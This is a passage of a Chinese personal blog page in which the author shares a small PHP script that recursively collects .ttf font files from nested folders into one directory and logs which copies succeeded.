</div><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a href="/tags/经验分享/" class="post__tag__link">经验分享</a></li></ul><a href="/2009/06/22/php-learning-experience/#disqus_thread" class="post__foot-link u-fr">0 COMMENTS</a></footer></article><article class="post"><header class="post__head"><time datetime="2009-04-18T01:50:32.000Z" class="post__time">April 18, 2009</time><h1 class="post__title"><a href="/2009/04/18/a-little-php-program/">一个小小的php程序</a></h1></header><div class="post__main"><p>记得有一次樊老师让我把一个文件夹中所有的文件改一下文件名，弄了很久弄出一个bat的批处理文件，自己还不大明白什么意思，不过终于是弄好了。这次帮朋友下载了一百多个字体，而且每一个都在不同的文件夹中，这样用粘贴复制累死了，我想用php写一个不会有什么问题吧，然后结合网上一些资料，这个家伙弄出来了：</p>
<figure class="highlight"><pre><span class="comment">/**
 * 使用方法如下
 * shift函数的第一个文件为查找文件，后一参数为拷贝后的文件夹,
 * 后一个文件路径一定不能位于第一个文件中，这样可能进入死循环
 * 注意:文件路径一定要用/而不是\，路径要全，不能留开口如：H:/fonts；默认的是查找ttf格式字体文件，查找其他需要自行修改
 * 虽然这些稍加修改就能避免的，但是这仅仅给自己用用，我肯定假设自己会用，故稍加注意就好使
 * 只要电脑上配有php，在任何地方都可以运行，双击我给的批处理文件就行
 * 测试发现拷贝大些的文件速度不快，但是对内存和cpu的占有不是很大
 */</span>
<span class="function"><span class="keyword">function</span> <span class="title">type</span><span class="params">(<span class="variable">$filename</span>)</span>
{</span>

    <span class="variable">$match_type</span> = <span class="keyword">array</span>(&quot;ttf&quot;);<span class="comment">//目标后缀数组</span>

    <span class="keyword">foreach</span>(<span class="variable">$match_type</span> <span class="keyword">as</span> <span class="variable">$val</span>)
    {
        <span class="comment">//循环匹配数组$match_type中的后缀，自行修改匹配模式可以选择不同的文件名，不分大小写</span>
        <span class="keyword">if</span>(preg_match(&quot;/\.<span class="variable">$val</span>$/i&quot;,<span class="variable">$filename</span>))
        {
            <span class="keyword">return</span> <span class="keyword">true</span>;
        }
    }

    <span class="keyword">return</span> <span class="keyword">false</span>;
}

<span class="function"><span class="keyword">function</span> <span class="title">shift</span><span class="params">(<span class="variable">$dir</span>,<span class="variable">$md</span>)</span>
{</span>
    <span class="keyword">if</span>(is_dir(<span class="variable">$dir</span>))
    {
        <span class="variable">$pp</span> = fopen(<span class="variable">$md</span>.<span class="string">'message.txt'</span>,&quot;w+&quot;);<span class="comment">//创建信息文件，文件将说明成功复制的文件及失败了文件</span>

        <span class="variable">$mesage</span> = <span class="string">''</span>;<span class="comment">//初始化信息</span>

        <span class="keyword">if</span> (<span class="variable">$dh</span> = opendir(<span class="variable">$dir</span>))
        {
            <span class="comment">//循环读取文件中的文件名</span>
            <span class="keyword">while</span> ((<span class="variable">$file</span>= readdir(<span class="variable">$dh</span>)) !== <span class="keyword">false</span>)
            {

                <span class="variable">$dir_new</span>=<span class="variable">$dir</span>;

                <span class="variable">$dir_new</span>.=<span class="variable">$file</span>.&quot;/&quot;;

                <span class="comment">//如果是文件夹，递归重新调用shift函数</span>
                <span class="keyword">if</span>((is_dir(<span class="variable">$dir_new</span>)) &amp;&amp; <span class="variable">$file</span>!=&quot;.&quot; &amp;&amp; <span class="variable">$file</span>!=&quot;..&quot;)
                {
                    shift(<span class="variable">$dir_new</span>,<span class="variable">$md</span>);
                }
                <span class="keyword">else</span>
                {
                    <span class="keyword">if</span>(<span class="variable">$file</span>!=&quot;.&quot; &amp;&amp; <span class="variable">$file</span>!=&quot;..&quot;)
                    {
                        <span class="comment">//如果是文件</span>
                        <span class="keyword">if</span>(type(<span class="variable">$file</span>))
                        {
                            <span class="variable">$newfile</span> =<span class="variable">$md</span>.<span class="variable">$file</span>;
                            <span class="variable">$p</span>=fopen(<span class="variable">$newfile</span>,<span class="string">'w+'</span>);<span class="comment">//在目标文件夹中创建拷贝文件</span>
                            <span class="keyword">if</span>(copy(<span class="variable">$dir_new</span>,<span class="variable">$newfile</span>))
                            {<span class="comment">//复制文件</span>
                                <span class="variable">$mesage</span> .= &quot;成功复制&quot;.<span class="variable">$file</span>.&quot; : <span class="variable">$dir_new</span>=&gt;<span class="variable">$md</span><span class="comment">//记录\n&quot;;</span>
                            }
                            <span class="keyword">else</span>
                            {
                                <span class="variable">$mesage</span> .= &quot;复制失败&quot;.<span class="variable">$file</span>.&quot;<span class="comment">//记录\n&quot;;</span>
                            }

                            fclose(<span class="variable">$p</span>);

                        }

                    }

                }

            }
            closedir(<span class="variable">$dh</span>);
            fwrite(<span class="variable">$pp</span>,<span class="variable">$mesage</span>);
            fclose(<span class="variable">$pp</span>);
        }
    }
}

shift(<span class="string">"H:/fonts/"</span>,<span class="string">"E:/ttf/"</span>);
</pre></figure>

<p>运行使用的bat批处理文件就两句</p>
<figure class="highlight"><pre><span class="variable">$ </span>php file.php
</pre></figure>

<p>呵呵，原理php还是很有用嘛……下面是附件，php在本地运行不需要在发布根目录下，只要两个文件在一起就行</p>
</div><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a href="/tags/php探索/" class="post__tag__link">php探索</a></li><li class="post__tag__item"><a href="/tags/php/" class="post__tag__link">php</a></li></ul><a href="/2009/04/18/a-little-php-program/#disqus_thread" class="post__foot-link u-fr">0 COMMENTS</a></footer></article></main><footer class="site-foot"><div class="site-copy u-fl">© 2017 Eward Song<bdi>&nbsp;❤&nbsp;Theme by <a href="http://unmric.com">unmric</a></bdi></div><menu class="page-menu u-fr"><li class="page-menu__item"><span title="Previous" class="page-menu__link icon-arrow-left page-menu__link--disabled"></span></li><li class="page-menu__item"><span title="Next" class="page-menu__link icon-arrow-right page-menu__link--disabled"></span></li></menu></footer><script>(function(h,g,l,k,j,i){j=h.createElement(g),i=h.getElementsByTagName(g)[0],
j.src="//"+l+".disqus.com/"+k+".js",i.parentNode.insertBefore(j,i)})
(document,"script","shepherdwind","count");
</script>